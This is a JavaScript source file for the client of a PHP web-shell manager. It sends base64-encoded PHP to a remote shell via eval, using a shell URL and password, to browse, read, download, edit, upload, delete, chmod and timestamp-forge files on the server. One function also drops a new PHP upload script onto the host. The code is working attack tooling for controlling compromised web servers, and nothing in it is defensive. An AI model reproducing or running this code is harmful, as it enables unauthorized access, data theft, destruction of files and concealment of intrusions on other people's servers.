/**
 * Created by abcdlzy on 15/3/10.
 */

var currentDir;

function initFileManage(){

    getDiskSpace();
    initUploadControl();
    reloadFileTable();
    getCurrentDirInfo();
    $('#cal-new-event').modal('hide');
}

function initUploadControl(){
    $(document)
        .on('change', '.btn-file :file', function() {
            var input = $(this),
                numFiles = input.get(0).files ? input.get(0).files.length : 1,
                label = input.val().replace(/\\/g, '/').replace(/.*\//, '');

            var inputText = $(this).parents('.input-group').find(':text'),
                log = numFiles > 1 ? numFiles + ' files selected' : label;

            console.log(log);

            if( inputText.length ) {
                inputText.val(log);
            } else {
                if( log ) alert(log);
            }
        });

}

function sizecount(size) {
    var unit = Array('Bytes', 'KB', 'MB', 'GB', 'TB','PB');
    var i;
    for (i = 0; size >= 1024 && i < 5; i++) {
        size /= 1024;
    }
    return Math.round(size*100)/100+' '+unit[i];
}

function getDiskSpace(){
    var postcode="	$cwd = getcwd();$free = @disk_free_space($cwd);if(!$free) $free = 0;$all = @disk_total_space($cwd);if(!$all) $all = 0;$used = $all-$free;echo $used.','.$free.','.$all.','.@round(100/($all/$free),2);";


    doEvalCode(postcode,function(data){
        var datacode=data.split(',');
        $('#diskTotal').html(sizecount(datacode[2]));
        $('#diskUsedText').html(sizecount(datacode[0]));
        $('#diskUsed').data('value',(datacode[0]/(1024*1024*1024)).toFixed(2));
        $('#diskUsedPercentageNum').data('value',Math.round((100-datacode[3])*100)/100);
        $('#diskUsedProgressBar').data('percentage',(100-datacode[3])+'%');
        loadJs('./assets/js/minimal.min.js');
    });

}

function ajaxFileUpload() {
    /*
     $("#loading")
     .ajaxStart(function(){
     $(this).show();
     })
     .ajaxComplete(function(){
     $(this).hide();
     });
     */
    var postCode="" +
        "\$error = '';" +
        "\$msg = '';" +
        "\$fileElementName = 'fileManageUploader';" +
        "\$position='"+$('#inputCurrentDir').val()+"';" +
        "if(!empty(\$_FILES[\$fileElementName]['error']))" +
        "{" +
        "switch(\$_FILES[\$fileElementName]['error']){" +
        "case '1':\$error = 'The uploaded file exceeds the upload_max_filesize directive in php.ini';break;" +
        "case '2':\$error = 'The uploaded file exceeds the MAX_FILE_SIZE directive that was specified in the HTML form';break;" +
        "case '3':\$error = 'The uploaded file was only partially uploaded';break;" +
        "case '4':\$error = 'No file was uploaded.';break;" +
        "case '6':\$error = 'Missing a temporary folder';break;" +
        "case '7':\$error = 'Failed to write file to disk';break;" +
        "case '8':\$error = 'File upload stopped by extension';break;" +
        "case '999':" +
        "default:\$error = 'No error code avaiable';" +
        "}}elseif(empty(\$_FILES[\$fileElementName]['tmp_name']) || \$_FILES[\$fileElementName]['tmp_name'] == 'none')" +
        "{" +
        "\$error = 'No file was uploaded..';" +
        "}else{" +
        "\$msg .= ' File Name: ' . \$_FILES[\$fileElementName]['name'] . ', ';" +
        "\$msg .= ' File Size: ' . @filesize(\$_FILES[\$fileElementName]['tmp_name']);" +
        "move_uploaded_file(\$_FILES[\$fileElementName]['tmp_name'],\$position.'/'.\$_FILES[\$fileElementName]['name']);" +
        "}echo json_encode(['error'=>\$error,'msg'=>\$msg]);";

    $.ajaxFileUpload
    (
        {
            url:runshellURL,
            secureuri:false,
            fileElementId:'fileManageUploader',
            dataType: 'json',
            data:{URL:shellURL,pass:shellPass,code:"eval(urldecode(base64_decode('"+base64.encode(postCode)+"')));"},
            success: function (data, status)
            {
                if(typeof(data.error) != 'undefined')
                {
                    if(data.error.trim() != '')
                    {
                        toastShow('warning','上传文件失败,MSG:'+data.error+' ',5000);
                    }else
                    {

                        toastShow('success','上传文件成功,MSG:'+data.msg+' ',5000);
                        getCurrentDirInfo();
                    }
                }
            },
            error: function (data, status, e)
            {
                toastShow('warning','上传文件失败,MSG:'+e+' ',5000);
            }
        }
    )

    return false;

}

function ajaxFileUpload1() {
    /*
     $("#loading")
     .ajaxStart(function(){
     $(this).show();
     })
     .ajaxComplete(function(){
     $(this).hide();
     });
     */
    var postCode="" +
        "file_put_contents('uploadUpload.php',\"" +
        "<?php " +
        "\\\$error = '';" +
        "\\\$msg = '';" +
        "\\\$fileElementName = 'fileManageUploader';var_dump(\\\$_FILES);" +
        "if(!empty(\\\$_FILES[\\\$fileElementName]['error']))" +
        "{" +
        "switch(\\\$_FILES[\\\$fileElementName]['error']){" +
        "case '1':\\\$error = 'The uploaded file exceeds the upload_max_filesize directive in php.ini';break;" +
        "case '2':\\\$error = 'The uploaded file exceeds the MAX_FILE_SIZE directive that was specified in the HTML form';break;" +
        "case '3':\\\$error = 'The uploaded file was only partially uploaded';break;" +
        "case '4':\\\$error = 'No file was uploaded.';break;" +
        "case '6':\\\$error = 'Missing a temporary folder';break;" +
        "case '7':\\\$error = 'Failed to write file to disk';break;" +
        "case '8':\\\$error = 'File upload stopped by extension';break;" +
        "case '999':" +
        "default:\\\$error = 'No error code avaiable';" +
        "}}elseif(empty(\\\$_FILES[\\\$fileElementName]['tmp_name']) || \\\$_FILES[\\\$fileElementName]['tmp_name'] == 'none')" +
        "{" +
        "\\\$error = 'No file was uploaded..';" +
        "}else{" +
        "\\\$msg .= ' File Name: ' . \\\$_FILES[\\\$fileElementName]['name'] . ', ';" +
        "\\\$msg .= ' File Size: ' . @filesize(\\\$_FILES[\\\$fileElementName]['tmp_name']);" +
        "move_uploaded_file(\\\$_FILES[\\\$fileElementName]['tmp_name'],\\\$_POST['position'].'/'.\\\$_FILES[\\\$fileElementName]['name']);" +
        "}echo '{';" +
        "echo				'error: ' . \\\$error . ',\\\n';" +
        "echo				'msg: ' . \\\$msg . '\\\n';" +
        "echo '}';" +
        "\?>\");echo 'true';";
    //生成上传文件功能
    doEvalCode(postCode,function(data){
        if(data=='true'){

            var uploadURL='';
            for(var i=0;i<shellURL.split('/').length-1;i++){
                uploadURL+=shellURL.split('/')[i]+'/';
            }
            $.ajaxFileUpload
            (
                {
                    url:runshellURL,
                    secureuri:false,
                    fileElementId:'fileManageUploader',
                    dataType: 'json',
                    data:{URL:uploadURL+'uploadUpload.php',pass:'position',code:$('#inputCurrentDir').val()},
                    success: function (data, status)
                    {
                        if(typeof(data.error) != 'undefined')
                        {
                            if(data.error.trim() != '')
                            {
                                alert(data.error);
                            }else
                            {
                                alert(data.msg);
                            }
                        }
                    },
                    error: function (data, status, e)
                    {
                        alert(e);
                    }
                }
            )
        }
    });



    return false;

}


function getCurrentDirInfo(){
    currentDir=$('#inputCurrentDir').val();

    var cwdstr='';
    if(currentDir=="")
    {
        cwdstr='getcwd()';
    }
    else if(currentDir==":webRoot"){
        cwdstr="\$_SERVER['DOCUMENT_ROOT']";
    }
    else if(currentDir==":scriptRoot"){
        cwdstr='getcwd()';
    }
    else{

        cwdstr='\''+currentDir+'\'';
        if(cwdstr.length>3){
            if(cwdstr.charAt(cwdstr.length-2)=='/'){
                cwdstr=cwdstr.substr(0,cwdstr.length-2)+'\'';
            }

        }
    }

    var postcode="function getUser(\$file)	{" +
        "if (function_exists('posix_getpwuid')) {" +
        "\$array = @posix_getpwuid(@fileowner(\$file));" +
        "if (\$array && is_array(\$array)) {" +
        "return \$array;}" +
        "}" +
        "return '';" +
        "}function getPerms(\$file) {\$mode = @fileperms(\$file);if ((\$mode & 0xC000) === 0xC000) {\$type = 's';}elseif ((\$mode & 0x4000) === 0x4000) {\$type = 'd';}elseif ((\$mode & 0xA000) === 0xA000) {\$type = 'l';}elseif ((\$mode & 0x8000) === 0x8000) {\$type = '-';}elseif ((\$mode & 0x6000) === 0x6000) {\$type = 'b';}elseif ((\$mode & 0x2000) === 0x2000) {\$type = 'c';}elseif ((\$mode & 0x1000) === 0x1000) {\$type = 'p';}else {\$type = '?';}\$owner['read'] = (\$mode & 00400) ? 'r' : '-';\$owner['write'] = (\$mode & 00200) ? 'w' : '-';\$owner['execute'] = (\$mode & 00100) ? 'x' : '-';\$group['read'] = (\$mode & 00040) ? 'r' : '-';\$group['write'] = (\$mode & 00020) ? 'w' : '-';\$group['execute'] = (\$mode & 00010) ? 'x' : '-';\$world['read'] = (\$mode & 00004) ? 'r' : '-';\$world['write'] = (\$mode & 00002) ? 'w' : '-';\$world['execute'] = (\$mode & 00001) ? 'x' : '-';if( \$mode & 0x800 ) {\$owner['execute'] = (\$owner['execute']=='x') ? 's' : 'S';}if( \$mode & 0x400 ) {\$group['execute'] = (\$group['execute']=='x') ? 's' : 'S';}if( \$mode & 0x200 ) {\$world['execute'] = (\$world['execute']=='x') ? 't' : 'T';}return \$type.\$owner['read'].\$owner['write'].\$owner['execute'].\$group['read'].\$group['write'].\$group['execute'].\$world['read'].\$world['write'].\$world['execute'];}function getChmod(\$file){return substr(base_convert(@fileperms(\$file),10,8),-4);}\$cwd = "+cwdstr+";\$dir_writeable = @is_writable(\$cwd) ? '可写' : '不可写';\$cwd_links = '';\$path = explode('/', str_replace('\\\\','/',$cwd));" +
        "function getUpPath(\$cwd) " +
        "{\$pathdb = explode('/', str_replace('\\\\','/',$cwd));" +
        "\$num = count(\$pathdb);" +
        "if (\$num > 1) {unset(\$pathdb[$num],\$pathdb[$num-1]);}" +
        "\$uppath = implode('/', \$pathdb).'/'" +";" +
        "\$uppath = str_replace('//', '/', \$uppath);" +
        "return \$uppath;}" +
        "\$dirdata=\$filedata=array();\$dirs = @scandir(\$cwd);if (\$dirs) {\$dirs = array_diff(\$dirs, array('.'));foreach (\$dirs as \$file) {\$filepath=\$cwd.'/'.\$file;if(@is_dir(\$filepath)){\$dirdb['filename']=\$file;\$dirdb['mtime']=@date('Y-m-d H:i:s',filemtime(\$filepath));\$dirdb['chmod']=getChmod(\$filepath);\$dirdb['perm']=getPerms(\$filepath);\$dirdb['owner']=getUser(\$filepath);\$dirdb['link']=\$filepath;if(\$file!='..'){\$dirdata[]=\$dirdb;}} else {\$filedb['filename']=\$file;\$filedb['size']=sprintf('%u', @filesize(\$filepath));\$filedb['mtime']=@date('Y-m-d H:i:s',filemtime(\$filepath));\$filedb['chmod']=getChmod(\$filepath);\$filedb['perm']=getPerms(\$filepath);\$filedb['owner']=getUser(\$filepath);\$filedb['link']=\$filepath;\$filedata[]=\$filedb;}}unset(\$dirdb);unset(\$filedb);}" +
        "echo json_encode(['chmod'=>getChmod(\$cwd),'perms'=>getPerms(\$cwd),'user'=>getUser(\$cwd),'path'=>\$path,'writeable'=>@is_writable(\$cwd)?'true':'false','dirdata'=>\$dirdata,'filedata'=>\$filedata,'upPath'=>getUpPath(\$cwd)]);";
    doEvalCode(postcode,function(data){

        reloadFileTable();

        if(JSON.parse(data)){
            var jsonData=JSON.parse(data);
            var path=jsonData.path;

            var link = '';
            var pathStr='';
            for(var i=0;i<path.length;i++) {
                link += '<a style="color:white;" href="javascript:goDir(\'';
                for(var j=0;j<=i;j++) {
                    if(j!=path.length-1){
                        link += path[j]+'/';
                    }
                    else{
                        link += path[j];
                    }
                }
                if(i<path.length-1){
                    link += '\');">'+path[i]+'/</a>';
                    pathStr+=path[i]+'/';
                }
                else{
                    link += '\');">'+path[i]+'</a>';
                    pathStr+=path[i];
                }
            }



            $('#dirInfo').html(link+'&nbsp;&nbsp;&nbsp;-&nbsp;&nbsp;&nbsp;权限：'+jsonData.chmod+'/'+jsonData.perms+'/'+jsonData.user.name+' - 当前文件夹：'+(jsonData.writeable=='true'?'可写':'不可写'));
            $('#inputCurrentDir').val(pathStr);

            if(pathStr.replace("\\", "/").split('/').length>1){
                $('#basicDataTable').dataTable().fnAddData([
                    '文件夹',
                    '<a style="color:white;" href="javascript:goDir(\''+jsonData.upPath.replace("\\", "/")+'\')">../（上级文件夹）</a>',
                    null,
                    null,
                    null,
                    null

                ]);
            }

            for(var i=0;i<jsonData.dirdata.length;i++){

                $('#basicDataTable').dataTable().fnAddData([
                    '文件夹',
                    '<a style="color:white;" href="javascript:goDir(\''+jsonData.dirdata[i].link+'\')">'+jsonData.dirdata[i].filename+'</a>',
                    '<a style="color:white;" data-toggle="modal"  href="#timeBox" onclick="setTimesBox(\''+jsonData.dirdata[i].link+'\',\''+jsonData.dirdata[i].mtime+'\')">'+jsonData.dirdata[i].mtime+'</a>',
                    null,
                    '<a style="color:white;" data-toggle="modal"  href="#permissionsBox" onclick="setPermBox(\''+jsonData.dirdata[i].link+'\',\''+jsonData.dirdata[i].chmod+'\')">'+jsonData.dirdata[i].chmod+'/'+
                    jsonData.dirdata[i].perm+'</a>',
                    '<a style="color:white;" data-toggle="modal"  href="#renameBox" onclick="setRenameBox(\''+jsonData.dirdata[i].link+'\',\''+jsonData.dirdata[i].filename+'\')">重命名/移动</a>｜'+
                    '<a style="color:white;" data-toggle="modal"  href="#deleteBox" onclick="setDeleteBox(\''+jsonData.dirdata[i].link+'\')">'+'删除'+'</a>'

                ]);
            }
            for(var i=0;i<jsonData.filedata.length;i++){

                $('#basicDataTable').dataTable().fnAddData([
                    '文件',
                    '<a style="color:white;" href="javascript:downFile(\''+jsonData.filedata[i].link+'\')">'+jsonData.filedata[i].filename+'</a>',
                    '<a style="color:white;" data-toggle="modal"  href="#timeBox" onclick="setTimesBox(\''+jsonData.filedata[i].link+'\',\''+jsonData.filedata[i].mtime+'\')">'+jsonData.filedata[i].mtime+'</a>',
                    sizecount(jsonData.filedata[i].size),
                    '<a style="color:white;" data-toggle="modal"  href="#permissionsBox" onclick="setPermBox(\''+jsonData.filedata[i].link+'\',\''+jsonData.filedata[i].chmod+'\')">'+jsonData.filedata[i].chmod+'/'+
                    jsonData.filedata[i].perm+'</a>',
                    '<a style="color:white;" data-toggle="modal" href="#fileBox"  onclick="javascript:editFile(\''+jsonData.filedata[i].link+'\',\''+jsonData.filedata[i].filename+'\')">编辑</a>｜'+
                    '<a style="color:white;" data-toggle="modal"  href="#renameBox" onclick="setRenameBox(\''+jsonData.filedata[i].link+'\',\''+jsonData.filedata[i].filename+'\')">'+'重命名/移动'+'</a>｜'+
                    '<a style="color:white;" data-toggle="modal"  href="#deleteBox" onclick="setDeleteBox(\''+jsonData.filedata[i].link+'\')">'+'删除'+'</a>'

                ]);
            }


            initFileTableControl();

        }
    });
}

function downFile(file){
    var postCode="\$p1='"+file+"';if (is_file(\$p1) && is_readable(\$p1)) {@ob_end_clean();\$fileinfo = pathinfo(\$p1);if (function_exists('mime_content_type')) {\$type = @mime_content_type(\$p1);header(\"Content-Type: \".\$type);} else {header('Content-type: application/x-'.\$fileinfo['extension']);}header('Content-Disposition: attachment; filename='.\$fileinfo['basename']);header('Content-Length: '.sprintf(\"%u\", @filesize(\$p1)));@readfile(\$p1);exit;} else {die('文件不可读');}";
    window.open("./runshell.php?URL="+shellURL+"&pass="+shellPass+"&code=eval(urldecode(base64_decode('"+base64.encode(postCode)+"')));");
}

function downFile1(file){
    var postCode="\$p1='"+file+"';if (is_file(\$p1) && is_readable(\$p1)) {@ob_end_clean();\$fileinfo = pathinfo(\$p1);if (function_exists('mime_content_type')) {\$type = @mime_content_type(\$p1);header(\"Content-Type: \".\$type);} else {header('Content-type: application/x-'.\$fileinfo['extension']);}header('Content-Disposition: attachment; filename='.\$fileinfo['basename']);header('Content-Length: '.sprintf(\"%u\", @filesize(\$p1)));@readfile(\$p1);exit;} else {die('文件不可读');}";

    doEvalCode(postCode,function(response, status, xhr) {
        // check for a filename
        var filename = "";
        var disposition = xhr.getResponseHeader('Content-Disposition');
        if (disposition && disposition.indexOf('attachment') !== -1) {
            var filenameRegex = /filename[^;=\n]*=((['"]).*?\2|[^;\n]*)/;
            var matches = filenameRegex.exec(disposition);
            if (matches != null && matches[1]) filename = matches[1].replace(/['"]/g, '');
        }

        var type = xhr.getResponseHeader('Content-Type');
        var blob = new Blob([response], { type: type });

        if (typeof window.navigator.msSaveBlob !== 'undefined') {
            // IE workaround for "HTML7007: One or more blob URLs were revoked by closing the blob for which they were created. These URLs will no longer resolve as the data backing the URL has been freed."
            window.navigator.msSaveBlob(blob, filename);
        } else {
            var URL = window.URL || window.webkitURL;
            var downloadUrl = URL.createObjectURL(blob);

            if (filename) {
                // use HTML5 a[download] attribute to specify filename
                var a = document.createElement("a");
                // safari doesn't support this yet
                if (typeof a.download === 'undefined') {
                    window.location = downloadUrl;
                } else {
                    a.href = downloadUrl;
                    a.download = filename;
                    document.body.appendChild(a);
                    a.click();
                }
            } else {
                window.location = downloadUrl;
            }

            setTimeout(function () { URL.revokeObjectURL(downloadUrl); }, 100); // cleanup
        }
    });
}

function goDir(path){
    $('#inputCurrentDir').val(path);
    reloadFileTable();
    getCurrentDirInfo();
}


function reloadFileTable(){
//Delete the datable object first
    try {
        if ($('#basicDataTable').dataTable() != null)
        {
            var oTable = $('#basicDataTable').dataTable();
            oTable.fnDestroy();
        }
    }
    catch (e){
        ;
    }
    //Remove all the DOM elements
    $('#basicDataTable').empty();

    //
    // Add custom class to pagination div
    $.fn.dataTableExt.oStdClasses.sPaging = 'dataTables_paginate paging_bootstrap paging_custom';

    /*************************************************/
    /**************** BASIC DATATABLE ****************/
    /*************************************************/

    /* Define two custom functions (asc and desc) for string sorting */
    jQuery.fn.dataTableExt.oSort['string-case-asc']  = function(x,y) {
        return ((x < y) ? -1 : ((x > y) ?  1 : 0));
    };

    jQuery.fn.dataTableExt.oSort['string-case-desc'] = function(x,y) {
        return ((x < y) ?  1 : ((x > y) ? -1 : 0));
    };



    /* Build the DataTable with third column using our custom sort functions */
    var oTable01 = $('#basicDataTable').dataTable({
        "sDom":
        "R<'row'<'col-md-6'l><'col-md-6'f>r>"+
        "t"+
        "<'row'<'col-md-4 sm-center'i><'col-md-4'><'col-md-4 text-right sm-center'p>>",
        "oLanguage": {
            "sSearch": ""
        },
        "aaSorting": [ [0,'desc'], [1,'asc'] ],
        "aoColumns": [
            {"sTitle":'类型', "sWidth":'50px'},
            {"sTitle":'文件名'},
            {"sTitle":'修改日期', "sWidth":'180px'},
            {"sTitle":'文件大小', "sType": 'string-case', "sWidth":'100px' },
            {"sTitle":'权限', "asSorting": [ ], "sWidth":'80px' },
            { "sTitle":'操作',"asSorting": [ ] }
        ],
        "aLengthMenu":[[10, 25, 50, -1], [10, 25, 50, "所有"]],
        "iDisplayLength":50,
        columnDefs: [ {
            targets: [ 0 ],
            orderData: [ 0, 1 ]
        }, {
            targets: [ 1 ],
            "aaSorting": [ 0,'desc']
        }, {
            targets: [ 2 ],
            orderData: [ 0, 2 ]
        } ],
        "fnInitComplete": function(oSettings, json) {
            $('.dataTables_filter input').attr("placeholder", "搜索");
        }
    });



    /* Get the rows which are currently selected */
    function fnGetSelected(oTable01Local){
        return oTable01Local.$('tr.row_selected');
    };

}

function initFileTableControl(){
    /*
   //Add a click handler to the rows - this could be used as a callback
    $("#basicDataTable tbody tr").click( function( e ) {
        $(this).toggleClass('row_selected');

        // FadeIn/Out delete rows button
        if ($('#basicDataTable tr.row_selected').length > 0) {
            $('#deleteRow').stop().fadeIn(300);
        } else {
            $('#deleteRow').stop().fadeOut(300);
        }
    });

    // Append delete button to table
    var deleteRowLink = '<a id="deleteRow" class="btn btn-red btn-xs delete-row" data-toggle="modal"  href="#deleteBox" onclick="">删除选中对象</a>';
    $('#basicDataTable_wrapper').append(deleteRowLink);

    // Add a click handler for the delete row
    $('#deleteRow').click( function() {
        var anSelected = fnGetSelected(oTable01);
        if (anSelected.length !== 0 ) {
            oTable01.fnDeleteRow(anSelected[0]);
            $('#deleteRow').stop().fadeOut(300);
        }
    });
*/
    moment.lang('zh-cn');

    $('#fileTimeDate').datetimepicker({
        icons: {
            time: "fa fa-clock-o",
            date: "fa fa-calendar",
            up: "fa fa-arrow-up",
            down: "fa fa-arrow-down"
        },
        format:'YYYY-MM-DD HH:mm:ss'

    });

    $("#fileTimeDate").on("dp.show",function (e) {
        var newtop = $('.bootstrap-datetimepicker-widget').position().top ;
        $('.bootstrap-datetimepicker-widget').css('top', newtop + 'px');
    });
}

function setFileBox(fileName,fileData){
    $('#fileBoxFilePath').html($('#inputCurrentDir').val());
    $('#fileBoxFileName').val(fileName);
    $('#fileBoxFileData').val(fileData);
}

function setRenameBox(file,value){
    $('#fileRenameName').val(file);
    $('#fileRenameValue').val(file);
    $(".row_selected").toggleClass('row_selected');
}

function setTimesBox(file,value){
    $('#fileTimeName').val(file);
    $('#fileTimeDate').val(value);
    $(".row_selected").toggleClass('row_selected');
}

function setPermBox(file,value){
    $('#filePremsName').val(file);
    $('#filePremsValue').val(value);
    $(".row_selected").toggleClass('row_selected');
}

function setDeleteBox(file){
    $('#deleteFileName').val(file);
    $(".row_selected").toggleClass('row_selected');
}


function objRename(){
    var postcode="\$res=@rename('"+$('#fileRenameName').val()+"','"+$('#fileRenameValue').val()+"') ? 'success' : 'failed';" +
        "echo \$res;";

    doEvalCode(postcode,function(data){
        if(data=='success'){
            toastShow('success','重命名/移动操作成功',5000);
            getCurrentDirInfo();
        }
        else{
            toastShow('warning','重命名/移动操作失败',9000);
        }
    });
}

function objTimeChange(){
    var postcode="\$res=@touch('"+$('#fileTimeName').val()+"',strtotime('"+$('#fileTimeDate').val()+"'),strtotime('"+$('#fileTimeDate').val()+"')) ? 'success' : 'failed';" +
        "echo \$res;";

    doEvalCode(postcode,function(data){
        if(data=='success'){
            toastShow('success','目标时间修改成功',5000);
            getCurrentDirInfo();
        }
        else{
            toastShow('warning','目标时间修改失败',9000);
        }
    });
}

function objPermissionsChange(){
    var postcode="\$res=@chmod('"+$('#filePremsName').val()+"',base_convert('"+$('#filePremsValue').val()+"', 8, 10)) ? 'success' : 'failed';" +
        "echo \$res;";

    doEvalCode(postcode,function(data){
        if(data=='success'){
            toastShow('success','目标权限修改成功',5000);
            getCurrentDirInfo();
        }
        else{
            toastShow('warning','目标权限修改失败',9000);
        }
    });
}


function objsDelete(){
    var postcode="function deltree(\$deldir) {" +
        "\$dirs = @scandir(\$deldir);" +
        "if (\$dirs) {" +
        "\$dirs = array_diff(\$dirs, array('..', '.'));" +
        "foreach (\$dirs as \$file) {" +
        "if((is_dir(\$deldir.'/'.\$file))) {" +
        "@chmod(\$deldir.'/'.\$file,0777);" +
        "deltree(\$deldir.'/'.\$file);" +
        "} else {" +
        "@chmod(\$deldir.'/'.\$file,0777);" +
        "@unlink(\$deldir.'/'.\$file);" +
        "}" +
        "}" +
        "@chmod(\$deldir,0777);" +
        "return @rmdir(\$deldir) ? 1 : 0;" +
        "} else {" +
        "return 0;}}" +
        "\$res='failed';" +
        "\$targetFile='"+$('#deleteFileName').val()+"';" +
        "if (is_dir(\$targetFile)) {" +
        "\$res=@deltree(\$targetFile)? 'success' : 'deltree failed';" +
        "} else {"+
            "\$res=@unlink(\$targetFile)? 'success' : 'unlink failed';" +
        "}" +
        "echo \$res;";

    doEvalCode(postcode,function(data){
        if(data=='success'){
            toastShow('success','目标删除成功',5000);
            getCurrentDirInfo();
        }
        else{
            toastShow('warning','目标删除失败('+data+')',9000);
        }
    });
}


function editFile(file,filename){

    setFileBox(filename,'数据载入中……');

    var postcode="\$file='"+file+"';" +
        "if(file_exists(\$file)) {" +
        "\$fp=@fopen(\$file,'r');" +
        "\$contents=@fread(\$fp, filesize(\$file));" +
        "@fclose(\$fp);" +
        "echo \$contents;" +
        "}";

    doEvalCode(postcode,function(data){
        setFileBox(filename,data);
        $(".row_selected").toggleClass('row_selected');
    });
}


function saveFile(){

    var postcode="\$file='"+$('#inputCurrentDir').val()+"/"+$('#fileBoxFileName').val()+"';" +
        "\$fileData=base64_decode('"+base64.encode($('#fileBoxFileData').val())+"');" +
        "\$fp = @fopen(\$file,'w');" +
        "\$res=@fwrite(\$fp,\$fileData) ? 'success' : 'failed';" +
        "@fclose(\$fp);" +
        "echo \$res;";

    doEvalCode(postcode,function(data){
        if(data=='success'){
            toastShow('success','文件操作成功',5000);
            getCurrentDirInfo();
        }
        else{
            toastShow('warning','文件操作失败',9000);
        }
    });
}

function createDir(){
    var postcode="\$res=@mkdir('"+$('#inputCurrentDir').val()+"/"+$('#dirName').val()+"',0777) ? 'success' : 'failed';" +
        "echo \$res;";

    doEvalCode(postcode,function(data){
        if(data=='success'){
            toastShow('success','文件夹创建成功',5000);
            getCurrentDirInfo();
        }
        else{
            toastShow('warning','文件夹创建失败',9000);
        }
    });
}